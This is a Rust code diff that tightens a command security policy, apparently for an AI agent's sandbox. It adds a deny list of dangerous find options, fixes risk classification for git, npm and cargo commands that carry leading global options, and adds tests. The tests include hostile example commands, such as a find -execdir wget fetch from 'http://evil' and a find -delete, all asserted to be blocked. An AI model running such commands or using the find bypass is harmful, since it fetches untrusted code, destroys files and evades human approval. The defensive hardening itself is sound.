@@ -478,9 +478,15 @@ impl SecurityPolicy {
                 return CommandRiskLevel::High;
             }
 
-            // Medium-risk commands (state-changing, but not inherently destructive)
+            // Medium-risk commands (state-changing, but not inherently destructive).
+            // Scan ALL args for the state-changing verb, not just the first: a
+            // leading global option (`git --no-pager push`, `npm --prefix . install`,
+            // `git -C /path reset`) would otherwise shift the verb out of position
+            // and misclassify the command as Low, skipping the Supervised approval
+            // gate. A rare false-positive (an arg literally equal to a verb keyword)
+            // only over-prompts, which is the safe direction for a security gate.
             let medium = match base.as_str() {
-                "git" => args.first().is_some_and(|verb| {
+                "git" => args.iter().any(|verb| {
                     matches!(
                         verb.as_str(),
                         "commit"
@@ -497,13 +503,13 @@ impl SecurityPolicy {
                             | "tag"
                     )
                 }),
-                "npm" | "pnpm" | "yarn" => args.first().is_some_and(|verb| {
+                "npm" | "pnpm" | "yarn" => args.iter().any(|verb| {
                     matches!(
                         verb.as_str(),
                         "install" | "add" | "remove" | "uninstall" | "update" | "publish"
                     )
                 }),
-                "cargo" => args.first().is_some_and(|verb| {
+                "cargo" => args.iter().any(|verb| {
                     matches!(
                         verb.as_str(),
                         "add" | "remove" | "install" | "clean" | "publish"
@@ -686,8 +692,16 @@ impl SecurityPolicy {
         let base = base.to_ascii_lowercase();
         match base.as_str() {
             "find" => {
-                // find -exec and find -ok allow arbitrary command execution
-                !args.iter().any(|arg| arg == "-exec" || arg == "-ok")
+                // These options run commands or write/delete files, bypassing the
+                // command allowlist: -exec/-execdir/-ok/-okdir execute arbitrary
+                // commands; -delete removes files; -fprint/-fprintf/-fls write to
+                // arbitrary paths. (args are already lowercased by the caller.)
+                const FIND_DANGEROUS: &[&str] = &[
+                    "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls",
+                ];
+                !args
+                    .iter()
+                    .any(|arg| FIND_DANGEROUS.contains(&arg.as_str()))
             }
             "git" => {
                 // git config, alias, and -c can be used to set dangerous options
@@ -1213,6 +1227,65 @@ mod tests {
         assert_eq!(
             p.command_risk_level("rm -rf /tmp/test"),
             CommandRiskLevel::High
+        );
+    }
+
+    #[test]
+    fn find_command_execution_args_are_blocked() {
+        // `find` is allowlisted by default; its command-running / file-writing
+        // options must not be a hole in the allowlist. -exec/-ok were blocked;
+        // the -dir variants + -delete/-fprintf/-fls execute or write just the same.
+        let p = default_policy();
+        assert!(
+            !p.is_command_allowed("find . -execdir wget http://evil -O bd \\;"),
+            "find -execdir must be blocked (runs an otherwise-disallowed command)"
+        );
+        assert!(
+            !p.is_command_allowed("find . -okdir sh -c id \\;"),
+            "find -okdir must be blocked"
+        );
+        assert!(
+            !p.is_command_allowed("find . -type f -delete"),
+            "find -delete must be blocked"
+        );
+        assert!(
+            !p.is_command_allowed("find . -fprintf /tmp/x %p"),
+            "find -fprintf must be blocked"
+        );
+        // A benign find is still allowed.
+        assert!(
+            p.is_command_allowed("find . -name main.rs -type f"),
+            "benign find must stay allowed"
+        );
+    }
+
+    #[test]
+    fn state_changing_verb_after_a_global_option_is_still_medium_risk() {
+        // A leading global option (git --no-pager, npm --prefix, …) must not hide
+        // the state-changing verb and drop the command to Low risk, skipping the
+        // Supervised approval prompt.
+        let p = default_policy();
+        assert_eq!(
+            p.command_risk_level("git --no-pager push"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("git --no-pager reset --hard HEAD~3"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("npm --prefix . install"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("cargo --quiet install ripgrep"),
+            CommandRiskLevel::Medium
+        );
+        // Read-only verbs stay Low even with a global option.
+        assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
+        assert_eq!(
+            p.command_risk_level("git --no-pager log"),
+            CommandRiskLevel::Low
         );
     }
 
